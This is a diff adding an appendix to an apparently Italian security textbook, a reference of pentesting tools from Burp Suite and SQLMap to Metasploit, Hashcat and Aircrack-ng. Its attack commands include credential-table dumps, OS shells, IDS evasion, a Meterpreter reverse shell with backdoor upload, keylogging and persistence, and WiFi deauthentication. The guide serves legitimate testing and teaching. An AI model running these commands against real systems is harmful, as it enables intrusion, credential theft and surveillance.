@@ -1,0 +1,1154 @@
+\chapter{Appendice: Security Tools Reference}
+
+\begin{tcolorbox}[title=Scopo dell'appendice]
+Reference guide completa per security tools essenziali. Include installation, configurazione base, esempi d'uso e best practices per Burp Suite, OWASP ZAP, SQLMap, XSStrike, nmap, Metasploit, e molti altri.
+\end{tcolorbox}
+
+\section{Web Application Security Testing}
+
+\subsection{Burp Suite Professional/Community}
+
+\begin{tcolorbox}[colback=blue!10, colframe=blue!60, title=Overview]
+\textbf{Tipo}: Web vulnerability scanner \& proxy
+
+\textbf{Costo}: Community (free), Professional (\$449/anno)
+
+\textbf{Uso}: Manual + automated web app testing
+
+\textbf{Best for}: Comprehensive web app pentesting
+\end{tcolorbox}
+
+\begin{lstlisting}[language=bash, caption={Burp Suite installation \& setup}]
+# Download
+# https://portswigger.net/burp/communitydownload
+
+# Install (Linux)
+chmod +x burpsuite_community_linux_*.sh
+./burpsuite_community_linux_*.sh
+
+# Launch
+./BurpSuiteCommunity
+
+# Setup browser proxy
+# Firefox: Preferences → Network Settings
+# Manual proxy: 127.0.0.1:8080
+
+# Install Burp CA certificate
+# 1. Browser → http://burp
+# 2. Download CA certificate
+# 3. Firefox: Preferences → Privacy & Security → Certificates → View Certificates → Import
+\end{lstlisting}
+
+\textbf{Key Features}:
+\begin{itemize}
+    \item \textbf{Proxy}: Intercept/modify HTTP(S) requests
+    \item \textbf{Spider}: Crawl application
+    \item \textbf{Scanner}: Automated vulnerability detection (Pro only)
+    \item \textbf{Intruder}: Automated attacks, fuzzing
+    \item \textbf{Repeater}: Manual request editing
+    \item \textbf{Sequencer}: Token randomness analysis
+    \item \textbf{Decoder}: Encode/decode data
+    \item \textbf{Comparer}: Compare responses
+    \item \textbf{Extender}: Extensions marketplace
+\end{itemize}
+
+\textbf{Common Workflows}:
+
+\begin{lstlisting}[language=text, caption={Burp workflow examples}]
+# 1. SQLi Testing
+Proxy → Intercept request with parameter
+Send to Repeater (Ctrl+R)
+Modify parameter: id=1' OR '1'='1
+Analyze response for SQL errors
+
+# 2. Session token analysis
+Capture 20000+ session IDs
+Sequencer → Load tokens
+Start analysis
+Check entropy and randomness
+
+# 3. Brute force attack
+Intruder → Positions → Mark parameter
+Payloads → Load username list
+Attack → Start
+Analyze responses (different length/time = valid username)
+
+# 4. CSRF token bypass
+Compare → Load two similar requests
+Check if CSRF token changes
+If same token → potential CSRF vulnerability
+\end{lstlisting}
+
+\textbf{Useful Extensions}:
+\begin{itemize}
+    \item Autorize - Authorization testing
+    \item JWT Editor - JWT manipulation
+    \item Param Miner - Find hidden parameters
+    \item Retire.js - Detect vulnerable JS libraries
+    \item Turbo Intruder - Fast, custom attacks
+\end{itemize}
+
+\subsection{OWASP ZAP (Zed Attack Proxy)}
+
+\begin{tcolorbox}[colback=green!10, colframe=green!60, title=Overview]
+\textbf{Tipo}: Web vulnerability scanner \& proxy
+
+\textbf{Costo}: Free, open source
+
+\textbf{Uso}: Automated + manual testing, CI/CD integration
+
+\textbf{Best for}: Automated scanning, DevSecOps pipelines
+\end{tcolorbox}
+
+\begin{lstlisting}[language=bash, caption={ZAP installation \& usage}]
+# Installation (Linux)
+sudo apt install zaproxy
+
+# Or Docker
+docker pull owasp/zap2docker-stable
+
+# GUI Mode
+zaproxy
+
+# Headless baseline scan (passive only)
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t https://example.com
+
+# Full scan (active + passive)
+docker run -t owasp/zap2docker-stable zap-full-scan.py \
+  -t https://example.com \
+  -r report.html
+
+# API scan with OpenAPI spec
+docker run -v $(pwd):/zap/wrk:rw -t owasp/zap2docker-stable \
+  zap-api-scan.py \
+  -t https://api.example.com/openapi.json \
+  -f openapi \
+  -r api-report.html
+
+# Authenticated scan
+# 1. Configure authentication in ZAP context
+# 2. Export context.context file
+# 3. Run scan with context
+docker run -v $(pwd):/zap/wrk:rw -t owasp/zap2docker-stable \
+  zap-full-scan.py \
+  -t https://example.com \
+  -n context.context \
+  -U admin \
+  -r report.html
+\end{lstlisting}
+
+\textbf{ZAP Python API}:
+
+\begin{lstlisting}[language=Python, caption={ZAP automation script}]
+from zapv2 import ZAPv2
+import time
+
+# Connect to ZAP
+zap = ZAPv2(apikey='your-api-key',
+            proxies={'http': 'http://127.0.0.1:8080',
+                     'https': 'http://127.0.0.1:8080'})
+
+target = 'https://example.com'
+
+# Spider
+print('Spidering target...')
+scan_id = zap.spider.scan(target)
+
+while int(zap.spider.status(scan_id)) < 100:
+    print(f'Spider progress: {zap.spider.status(scan_id)}%')
+    time.sleep(2)
+
+print('Spider completed')
+
+# Active scan
+print('Starting active scan...')
+scan_id = zap.ascan.scan(target)
+
+while int(zap.ascan.status(scan_id)) < 100:
+    print(f'Scan progress: {zap.ascan.status(scan_id)}%')
+    time.sleep(5)
+
+print('Scan completed')
+
+# Get results
+alerts = zap.core.alerts(baseurl=target)
+
+print(f'\n{len(alerts)} alerts found:')
+for alert in alerts:
+    print(f"  [{alert['risk']}] {alert['alert']}")
+    print(f"    URL: {alert['url']}")
+    print(f"    Description: {alert['description'][:100]}...")
+    print()
+
+# Generate HTML report
+html_report = zap.core.htmlreport()
+with open('zap-report.html', 'w') as f:
+    f.write(html_report)
+
+print('Report saved to zap-report.html')
+\end{lstlisting}
+
+\textbf{CI/CD Integration}:
+
+\begin{lstlisting}[language=yaml, caption={GitLab CI ZAP integration}]
+# .gitlab-ci.yml
+stages:
+  - test
+  - security
+
+zap_scan:
+  stage: security
+  image: owasp/zap2docker-stable
+  script:
+    - mkdir -p /zap/wrk
+    - zap-baseline.py -t $TARGET_URL -r zap-report.html || true
+  artifacts:
+    paths:
+      - zap-report.html
+    when: always
+  allow_failure: true
+\end{lstlisting}
+
+\section{SQL Injection Testing}
+
+\subsection{SQLMap}
+
+\begin{tcolorbox}[colback=red!10, colframe=red!60, title=Overview]
+\textbf{Tipo}: Automated SQL injection tool
+
+\textbf{Costo}: Free, open source
+
+\textbf{Best for}: Comprehensive SQLi testing, database extraction
+\end{tcolorbox}
+
+\begin{lstlisting}[language=bash, caption={SQLMap comprehensive guide}]
+# Installation
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python sqlmap.py -h
+
+# Basic GET parameter testing
+sqlmap -u "http://example.com/product.php?id=1"
+
+# POST data
+sqlmap -u "http://example.com/login.php" \
+  --data="username=admin&password=test"
+
+# Cookie-based injection
+sqlmap -u "http://example.com/profile.php" \
+  --cookie="PHPSESSID=abc123; user_id=5"
+
+# JSON POST
+sqlmap -u "http://example.com/api/users" \
+  --data='{"id": 1}' \
+  --headers="Content-Type: application/json"
+
+# Test specific parameter
+sqlmap -u "http://example.com/search.php?q=test&cat=1" \
+  -p cat
+
+# Enumerate databases
+sqlmap -u "http://example.com/product.php?id=1" --dbs
+
+# Output:
+# [*] information_schema
+# [*] mysql
+# [*] performance_schema
+# [*] webapp_db
+
+# Enumerate tables in specific DB
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db --tables
+
+# Enumerate columns
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users --columns
+
+# Dump specific columns
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users -C username,email,password --dump
+
+# Dump entire table
+sqlmap -u "http://example.com/product.php?id=1" \
+  -D webapp_db -T users --dump
+
+# OS shell (if DB user has privileges)
+sqlmap -u "http://example.com/product.php?id=1" --os-shell
+
+# File read (if FILE privilege)
+sqlmap -u "http://example.com/product.php?id=1" \
+  --file-read="/etc/passwd"
+
+# Advanced options
+sqlmap -u "http://example.com/product.php?id=1" \
+  --level=5 \           # Test thoroughness (1-5)
+  --risk=3 \            # Risk level (1-3)
+  --threads=10 \        # Parallel requests
+  --batch \             # Never ask for input
+  --random-agent \      # Random User-Agent
+  --tamper=space2comment,between  # WAF bypass
+
+# Tamper scripts (WAF evasion)
+# space2comment: space → /**/
+# between: AND → BETWEEN
+# charencode: Character encoding
+# randomcase: RaNdOm CaSe
+# apostrophemask: ' → %EF%BC%87
+# equaltolike: = → LIKE
+# greatest: > → GREATEST
+
+# Request from file (Burp request)
+sqlmap -r request.txt
+
+# Save/resume session
+sqlmap -u "http://example.com/product.php?id=1" \
+  --batch --flush-session  # Start fresh
+
+# Configuration file
+sqlmap -c sqlmap.conf
+\end{lstlisting}
+
+\textbf{SQLMap Output}:
+
+\begin{lstlisting}[language=text, caption={Understanding SQLMap output}]
+[INFO] testing connection to the target URL
+[INFO] testing if the target URL content is stable
+[INFO] target URL content is stable
+[INFO] testing if GET parameter 'id' is dynamic
+[INFO] GET parameter 'id' appears to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[INFO] testing for SQL injection on GET parameter 'id'
+
+# Injection types tested:
+# boolean-based blind
+# time-based blind
+# error-based
+# UNION query-based
+# stacked queries
+
+[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
+\end{lstlisting}
+
+\section{XSS Testing}
+
+\subsection{XSStrike}
+
+\begin{lstlisting}[language=bash, caption={XSStrike usage}]
+# Installation
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip3 install -r requirements.txt
+
+# Basic scan
+python3 xsstrike.py -u "http://example.com/search.php?q=test"
+
+# POST request
+python3 xsstrike.py -u "http://example.com/comment.php" \
+  --data "comment=test&name=user"
+
+# Crawl mode (scan entire site)
+python3 xsstrike.py -u "http://example.com" --crawl -l 3
+
+# Skip DOM XSS check (faster)
+python3 xsstrike.py -u "http://example.com/search.php?q=test" \
+  --skip-dom
+
+# Custom headers
+python3 xsstrike.py -u "http://example.com/api/search" \
+  --headers "Authorization: Bearer token123"
+
+# Fuzzing mode
+python3 xsstrike.py -u "http://example.com/search.php?q=test" \
+  --fuzzer
+
+# JSON POST
+python3 xsstrike.py -u "http://example.com/api/comment" \
+  --data '{"text":"test"}' \
+  --headers "Content-Type: application/json"
+\end{lstlisting}
+
+\subsection{Dalfox}
+
+\begin{lstlisting}[language=bash, caption={Dalfox - Fast XSS scanner}]
+# Installation
+go install github.com/hahwul/dalfox/v2@latest
+
+# Single URL scan
+dalfox url "http://example.com/search?q=test"
+
+# File with URLs
+dalfox file urls.txt
+
+# Pipe mode
+cat urls.txt | dalfox pipe
+
+# Options
+dalfox url "http://example.com/search?q=test" \
+  --cookie "session=abc123" \
+  --user-agent "Custom UA" \
+  --mining-dict \        # Use mining dictionary
+  --mining-dom \         # DOM mining
+  --format json \        # JSON output
+  -o result.json
+\end{lstlisting>
+
+\section{Network Scanning}
+
+\subsection{Nmap}
+
+\begin{lstlisting}[language=bash, caption={Nmap comprehensive guide}]
+# Basic host discovery
+nmap -sn 192.168.1.0/24
+
+# TCP SYN scan (stealth)
+nmap -sS example.com
+
+# All ports
+nmap -p- example.com
+
+# Top 1000 ports (default)
+nmap example.com
+
+# Specific ports
+nmap -p 22,80,443,3306 example.com
+
+# Port range
+nmap -p 1-1000 example.com
+
+# Service/version detection
+nmap -sV example.com
+
+# OS detection
+sudo nmap -O example.com
+
+# Aggressive scan (OS, version, scripts, traceroute)
+nmap -A example.com
+
+# Script scanning
+nmap -sC example.com  # Default scripts
+
+# Specific scripts
+nmap --script=ssl-enum-ciphers -p 443 example.com
+nmap --script=http-methods -p 80 example.com
+nmap --script=http-title -p 80 example.com
+nmap --script=http-headers -p 80 example.com
+nmap --script=ssh-brute -p 22 example.com
+
+# Vulnerability scanning
+nmap --script vuln example.com
+
+# Multiple targets
+nmap 192.168.1.1 192.168.1.5 192.168.1.10
+nmap 192.168.1.1-10
+nmap 192.168.1.0/24
+
+# Input from file
+nmap -iL targets.txt
+
+# Timing templates (-T0 to -T5)
+# T0: Paranoid (IDS evasion, very slow)
+# T1: Sneaky
+# T2: Polite
+# T3: Normal (default)
+# T4: Aggressive (fast networks)
+# T5: Insane (very fast, may miss results)
+nmap -T4 example.com
+
+# Output formats
+nmap -oN scan.txt example.com      # Normal
+nmap -oX scan.xml example.com      # XML
+nmap -oG scan.gnmap example.com    # Grepable
+nmap -oA scan example.com          # All formats
+
+# Firewall/IDS evasion
+nmap -f example.com                # Fragment packets
+nmap -D RND:10 example.com         # Decoy scan (10 random decoys)
+nmap -S 192.168.1.50 example.com   # Spoof source IP
+nmap --source-port 53 example.com  # Source port manipulation
+nmap --data-length 200 example.com # Append random data
+nmap --randomize-hosts -iL hosts.txt  # Random scan order
+
+# Example: Comprehensive network pentest
+sudo nmap -sS -sV -O -A -p- -T4 \
+  --script vuln \
+  -oA comprehensive_scan \
+  192.168.1.0/24
+\end{lstlisting}
+
+\textbf{NSE Script Categories}:
+\begin{itemize}
+    \item \texttt{auth}: Authentication testing
+    \item \texttt{broadcast}: Broadcast discovery
+    \item \texttt{brute}: Brute force attacks
+    \item \texttt{default}: Default scripts (-sC)
+    \item \texttt{discovery}: Host/service discovery
+    \item \texttt{dos}: Denial of service
+    \item \texttt{exploit}: Exploitation scripts
+    \item \texttt{fuzzer}: Fuzzing
+    \item \texttt{intrusive}: Potentially harmful
+    \item \texttt{malware}: Malware detection
+    \item \texttt{safe}: Safe scripts
+    \item \texttt{version}: Version detection
+    \item \texttt{vuln}: Vulnerability detection
+\end{itemize}
+
+\subsection{Masscan}
+
+\begin{lstlisting}[language=bash, caption={Masscan - Fast port scanner}]
+# Installation
+sudo apt install masscan
+
+# Scan entire internet for port 80 (use responsibly!)
+sudo masscan 0.0.0.0/0 -p80
+
+# Scan specific network
+sudo masscan 192.168.1.0/24 -p1-65535 --rate=10000
+
+# Multiple ports
+sudo masscan 10.0.0.0/8 -p80,443,8080,8443
+
+# Output formats
+sudo masscan 192.168.1.0/24 -p80,443 -oL scan.txt
+sudo masscan 192.168.1.0/24 -p80,443 -oX scan.xml
+sudo masscan 192.168.1.0/24 -p80,443 -oJ scan.json
+
+# Banner grabbing
+sudo masscan 192.168.1.0/24 -p80,443 --banners
+
+# Masscan is VERY fast but less accurate than nmap
+# Best practice: masscan for initial sweep, nmap for detailed scan
+\end{lstlisting}
+
+\section{Exploitation Frameworks}
+
+\subsection{Metasploit Framework}
+
+\begin{lstlisting}[language=bash, caption={Metasploit guide}]
+# Start Metasploit console
+msfconsole
+
+# Update
+msfupdate
+
+# Search exploits
+msf6 > search wordpress
+msf6 > search type:exploit platform:linux
+msf6 > search cve:2021 rank:excellent
+
+# Use exploit
+msf6 > use exploit/multi/handler
+
+# Show options
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > show payloads
+msf6 exploit(multi/handler) > show advanced
+msf6 exploit(multi/handler) > show targets
+
+# Set options
+msf6 exploit(multi/handler) > set LHOST 192.168.1.100
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+# Check if target is vulnerable
+msf6 exploit(multi/handler) > check
+
+# Run exploit
+msf6 exploit(multi/handler) > exploit
+# Or: run, exploit -j (background)
+
+# Meterpreter commands
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > pwd
+meterpreter > ls
+meterpreter > cd /etc
+meterpreter > cat /etc/passwd
+meterpreter > download /etc/passwd
+meterpreter > upload backdoor.php /var/www/html/
+meterpreter > shell  # Get system shell
+meterpreter > screenshot
+meterpreter > webcam_snap
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+
+# Post-exploitation
+meterpreter > run post/linux/gather/checkvm
+meterpreter > run post/linux/gather/enum_configs
+meterpreter > run post/linux/gather/enum_system
+meterpreter > run post/linux/gather/hashdump
+
+# Persistence
+meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.100
+
+# Pivoting
+meterpreter > run autoroute -s 10.10.10.0/24
+meterpreter > background
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+# Database
+msf6 > db_status
+msf6 > db_nmap -sV 192.168.1.0/24
+msf6 > hosts
+msf6 > services
+msf6 > vulns
+
+# Workspaces
+msf6 > workspace -a project1
+msf6 > workspace project1
+\end{lstlisting}
+
+\section{Password Cracking}
+
+\subsection{Hashcat}
+
+\begin{lstlisting}[language=bash, caption={Hashcat password cracking}]
+# Installation
+sudo apt install hashcat
+
+# Identify hash type
+hashcat --example | grep -i md5
+
+# Hash type modes:
+# 0     = MD5
+# 100   = SHA1
+# 1000  = NTLM
+# 1400  = SHA256
+# 1800  = SHA512
+# 3200  = bcrypt
+# 9900  = Radmin2
+
+# Dictionary attack
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# Dictionary + rules
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Brute force (mask attack)
+# ?l = lowercase
+# ?u = uppercase
+# ?d = digit
+# ?s = special
+# ?a = all
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l  # 8 lowercase
+
+# Combination attack
+hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
+
+# Hybrid (wordlist + mask)
+hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
+
+# Example: Crack WordPress password
+hashcat -m 400 -a 0 wordpress_hash.txt rockyou.txt
+
+# Show cracked passwords
+hashcat -m 0 hashes.txt --show
+
+# Performance
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 3  # Workload (1-4)
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -O    # Optimized kernels
+
+# GPU selection
+hashcat -I  # Show devices
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1  # Use GPU 1
+\end{lstlisting}
+
+\subsection{John the Ripper}
+
+\begin{lstlisting}[language=bash, caption={John the Ripper}]
+# Installation
+sudo apt install john
+
+# Crack /etc/shadow
+sudo unshadow /etc/passwd /etc/shadow > hashes.txt
+john hashes.txt
+
+# Wordlist mode
+john --wordlist=rockyou.txt hashes.txt
+
+# Show cracked passwords
+john --show hashes.txt
+
+# Crack ZIP password
+zip2john encrypted.zip > zip_hash.txt
+john zip_hash.txt
+
+# Crack SSH private key
+ssh2john id_rsa > ssh_hash.txt
+john ssh_hash.txt
+
+# Format-specific
+john --format=raw-md5 md5_hashes.txt
+john --format=bcrypt bcrypt_hashes.txt
+\end{lstlisting}
+
+\section{Wireless Security}
+
+\subsection{Aircrack-ng}
+
+\begin{lstlisting}[language=bash, caption={Aircrack-ng WiFi security testing}]
+# IMPORTANTE: Solo su reti di tua proprietà!
+
+# Put interface in monitor mode
+sudo airmon-ng start wlan0
+
+# Capture packets
+sudo airodump-ng wlan0mon
+
+# Capture specific network
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth attack (capture handshake)
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WPA/WPA2
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+\end{lstlisting}
+
+\section{Reconnaissance}
+
+\subsection{theHarvester}
+
+\begin{lstlisting}[language=bash, caption={theHarvester - OSINT}]
+# Installation
+sudo apt install theharvester
+
+# Email enumeration
+theHarvester -d example.com -b google
+
+# Multiple sources
+theHarvester -d example.com -b google,bing,linkedin,twitter
+
+# All sources
+theHarvester -d example.com -b all
+
+# Subdomain enumeration
+theHarvester -d example.com -b sublist3r
+
+# Output
+theHarvester -d example.com -b google -f output.html
+theHarvester -d example.com -b google -f output.xml
+\end{lstlisting}
+
+\subsection{Sublist3r}
+
+\begin{lstlisting}[language=bash, caption={Sublist3r - Subdomain enumeration}]
+# Installation
+git clone https://github.com/aboul3la/Sublist3r.git
+cd Sublist3r
+pip install -r requirements.txt
+
+# Basic usage
+python sublist3r.py -d example.com
+
+# Enable brute force
+python sublist3r.py -d example.com -b
+
+# Specific engines
+python sublist3r.py -d example.com -e google,yahoo,bing
+
+# Port scan discovered subdomains
+python sublist3r.py -d example.com -p 80,443,8080
+
+# Output
+python sublist3r.py -d example.com -o output.txt
+\end{lstlisting}
+
+\subsection{Amass}
+
+\begin{lstlisting}[language=bash, caption={Amass - Advanced subdomain enumeration}]
+# Installation
+sudo apt install amass
+
+# Basic enumeration
+amass enum -d example.com
+
+# Passive mode (no active scanning)
+amass enum -passive -d example.com
+
+# With brute force
+amass enum -brute -d example.com
+
+# Output
+amass enum -d example.com -o output.txt
+
+# Visualization
+amass viz -d3 -d example.com
+\end{lstlisting}
+
+\section{Vulnerability Scanning}
+
+\subsection{Nikto}
+
+\begin{lstlisting}[language=bash, caption={Nikto web server scanner}]
+# Installation
+sudo apt install nikto
+
+# Basic scan
+nikto -h https://example.com
+
+# Scan multiple hosts
+nikto -h hosts.txt
+
+# Specific port
+nikto -h example.com -p 8080
+
+# SSL scan
+nikto -h example.com -ssl
+
+# Tuning (scan types)
+nikto -h example.com -Tuning 123456789
+
+# Tuning options:
+# 0 - File Upload
+# 1 - Interesting File
+# 2 - Misconfiguration
+# 3 - Information Disclosure
+# 4 - Injection (XSS/Script/HTML)
+# 5 - Remote File Retrieval
+# 6 - Denial of Service
+# 7 - Remote File Retrieval - Server Wide
+# 8 - Command Execution
+# 9 - SQL Injection
+
+# Output
+nikto -h example.com -o report.html -Format html
+\end{lstlisting}
+
+\subsection{Nuclei}
+
+\begin{lstlisting}[language=bash, caption={Nuclei - Fast vulnerability scanner}]
+# Installation
+go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
+
+# Update templates
+nuclei -update-templates
+
+# Scan single URL
+nuclei -u https://example.com
+
+# Scan multiple URLs
+nuclei -l urls.txt
+
+# Specific severity
+nuclei -u https://example.com -s critical,high
+
+# Specific tags
+nuclei -u https://example.com -tags cve,xss,sqli
+
+# Custom templates
+nuclei -u https://example.com -t custom-template.yaml
+
+# Output
+nuclei -u https://example.com -o results.txt
+nuclei -u https://example.com -json -o results.json
+
+# Rate limit
+nuclei -u https://example.com -rl 10  # 10 requests/second
+\end{lstlisting}
+
+\section{Static Analysis (SAST)}
+
+\subsection{Semgrep}
+
+\begin{lstlisting}[language=bash, caption={Semgrep - Static analysis}]
+# Installation
+pip3 install semgrep
+
+# Auto config (recommended rules)
+semgrep --config=auto /path/to/code
+
+# Specific ruleset
+semgrep --config=p/owasp-top-ten /path/to/code
+semgrep --config=p/python /path/to/code
+semgrep --config=p/javascript /path/to/code
+
+# Multiple configs
+semgrep --config=p/owasp-top-ten --config=p/jwt /path/to/code
+
+# JSON output
+semgrep --config=auto --json -o results.json /path/to/code
+
+# CI/CD integration
+# .gitlab-ci.yml
+semgrep_scan:
+  image: returntocorp/semgrep
+  script:
+    - semgrep --config=auto --json -o semgrep.json .
+  artifacts:
+    reports:
+      sast: semgrep.json
+\end{lstlisting}
+
+\subsection{Bandit (Python)}
+
+\begin{lstlisting}[language=bash, caption={Bandit - Python security linter}]
+# Installation
+pip install bandit
+
+# Scan directory
+bandit -r /path/to/python/code
+
+# Specific severity
+bandit -r /path/to/code -ll  # Low severity and higher
+bandit -r /path/to/code -lll # Medium and higher
+
+# Exclude tests
+bandit -r /path/to/code -x */tests/*
+
+# Output formats
+bandit -r /path/to/code -f json -o bandit-report.json
+bandit -r /path/to/code -f html -o bandit-report.html
+
+# Configuration file
+bandit -r /path/to/code -c .bandit
+\end{lstlisting}
+
+\section{Dependency Scanning}
+
+\subsection{Snyk}
+
+\begin{lstlisting}[language=bash, caption={Snyk - Dependency vulnerability scanner}]
+# Installation
+npm install -g snyk
+
+# Authenticate
+snyk auth
+
+# Test project
+snyk test
+
+# Test and fix
+snyk test --all-projects
+snyk wizard  # Interactive fix
+
+# Monitor (continuous)
+snyk monitor
+
+# Container scanning
+snyk container test nginx:latest
+
+# IaC scanning
+snyk iac test infrastructure.tf
+
+# JSON output
+snyk test --json > snyk-report.json
+\end{lstlisting}
+
+\subsection{Trivy}
+
+\begin{lstlisting}[language=bash, caption={Trivy - Container/filesystem scanner}]
+# Installation
+sudo apt install wget apt-transport-https gnupg lsb-release
+wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
+echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list
+sudo apt update
+sudo apt install trivy
+
+# Scan Docker image
+trivy image python:3.9
+
+# Scan filesystem
+trivy fs /path/to/project
+
+# Only high and critical
+trivy image --severity HIGH,CRITICAL nginx:latest
+
+# Scan Git repository
+trivy repo https://github.com/user/repo
+
+# Output formats
+trivy image --format json -o results.json nginx:latest
+trivy image --format table nginx:latest
+
+# CI/CD integration
+trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest
+\end{lstlisting}
+
+\section{Fuzzing}
+
+\subsection{ffuf}
+
+\begin{lstlisting}[language=bash, caption={ffuf - Web fuzzer}]
+# Installation
+go install github.com/ffuf/ffuf@latest
+
+# Directory fuzzing
+ffuf -u https://example.com/FUZZ -w wordlist.txt
+
+# File fuzzing
+ffuf -u https://example.com/FUZZ.php -w wordlist.txt
+
+# Subdomain fuzzing
+ffuf -u https://FUZZ.example.com -w subdomains.txt
+
+# Parameter fuzzing
+ffuf -u https://example.com/api?FUZZ=value -w params.txt
+
+# POST data fuzzing
+ffuf -u https://example.com/login \
+  -X POST \
+  -d "username=admin&password=FUZZ" \
+  -w passwords.txt
+
+# Multiple FUZZ points
+ffuf -u https://example.com/FUZZ1/FUZZ2 \
+  -w dirs.txt:FUZZ1 \
+  -w files.txt:FUZZ2
+
+# Filter by status code
+ffuf -u https://example.com/FUZZ -w wordlist.txt -fc 404
+
+# Filter by size
+ffuf -u https://example.com/FUZZ -w wordlist.txt -fs 1234
+
+# Match status code
+ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301
+
+# Threads
+ffuf -u https://example.com/FUZZ -w wordlist.txt -t 50
+
+# Output
+ffuf -u https://example.com/FUZZ -w wordlist.txt -o results.json -of json
+\end{lstlisting}
+
+\section{API Testing}
+
+\subsection{Postman/Newman}
+
+\begin{lstlisting}[language=bash, caption={Newman - Postman CLI}]
+# Installation
+npm install -g newman
+
+# Run collection
+newman run collection.json
+
+# With environment
+newman run collection.json -e environment.json
+
+# Reporters
+newman run collection.json -r cli,json,html
+
+# Output
+newman run collection.json \
+  --reporters cli,json \
+  --reporter-json-export results.json
+
+# CI/CD integration
+newman run api-tests.json --bail
+\end{lstlisting}
+
+\section{SSL/TLS Testing}
+
+\subsection{testssl.sh}
+
+\begin{lstlisting}[language=bash, caption={testssl.sh - SSL/TLS tester}]
+# Installation
+git clone --depth 1 https://github.com/drwetter/testssl.sh.git
+cd testssl.sh
+
+# Basic test
+./testssl.sh https://example.com
+
+# Specific tests
+./testssl.sh -p https://example.com  # Protocols
+./testssl.sh -e https://example.com  # Cipher suites
+./testssl.sh -S https://example.com  # Server defaults
+./testssl.sh -P https://example.com  # Server preferences
+./testssl.sh -U https://example.com  # Vulnerabilities
+
+# All tests
+./testssl.sh -U --sneaky https://example.com
+
+# JSON output
+./testssl.sh --json https://example.com
+
+# HTML output
+./testssl.sh --html https://example.com
+\end{lstlisting}
+
+\section{Reporting}
+
+\subsection{Dradis}
+
+\begin{lstlisting}[language=bash, caption={Dradis - Reporting framework}]
+# Installation (Docker)
+docker run -p 3000:3000 dradis/dradis
+
+# Access
+http://localhost:3000
+
+# Features:
+# - Import from Burp, ZAP, Nessus, nmap
+# - Collaborative editing
+# - Template-based reporting
+# - Export to Word, Excel, PDF
+\end{lstlisting}
+
+\section{All-in-One Distributions}
+
+\subsection{Kali Linux}
+
+\begin{tcolorbox}[colback=purple!10, colframe=purple!60, title=Kali Linux]
+Pre-configured penetration testing distribution with 600+ tools.
+
+\textbf{Download}: \url{https://www.kali.org/downloads/}
+
+\textbf{Included tools}:
+\begin{itemize}
+    \item Information Gathering: nmap, theHarvester, Amass
+    \item Vulnerability Analysis: Nikto, SQLMap, Nuclei
+    \item Web Applications: Burp Suite, OWASP ZAP
+    \item Exploitation: Metasploit, SQLMap
+    \item Password Attacks: Hashcat, John, Hydra
+    \item Wireless Attacks: Aircrack-ng, Wifite
+    \item Forensics: Autopsy, Volatility
+\end{itemize}
+\end{tcolorbox}
+
+\subsection{Parrot Security OS}
+
+Alternative to Kali with similar toolset and better privacy focus.
+
+\section{Tool Selection Guide}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Task} & \textbf{Recommended Tool} \\
+\hline
+Web app manual testing & Burp Suite \\
+Web app automated scan & OWASP ZAP \\
+SQLi testing & SQLMap \\
+XSS testing & XSStrike, Dalfox \\
+Network scan & nmap \\
+Port scan (fast) & masscan \\
+Exploitation & Metasploit \\
+Password cracking & Hashcat \\
+Subdomain enum & Amass \\
+Directory fuzzing & ffuf, gobuster \\
+Static analysis & Semgrep \\
+Dependency scan & Snyk, Trivy \\
+API testing & Postman/Newman \\
+SSL testing & testssl.sh \\
+\hline
+\end{tabular}
+\caption{Tool selection quick reference}
+\end{table}
+
+\section{Riferimenti}
+
+\begin{itemize}
+    \item Burp Suite Documentation: \url{https://portswigger.net/burp/documentation}
+    \item OWASP ZAP User Guide: \url{https://www.zaproxy.org/docs/}
+    \item SQLMap Wiki: \url{https://github.com/sqlmapproject/sqlmap/wiki}
+    \item Nmap Reference Guide: \url{https://nmap.org/book/}
+    \item Metasploit Unleashed: \url{https://www.offensive-security.com/metasploit-unleashed/}
+    \item Kali Tools: \url{https://www.kali.org/tools/}
+\end{itemize}
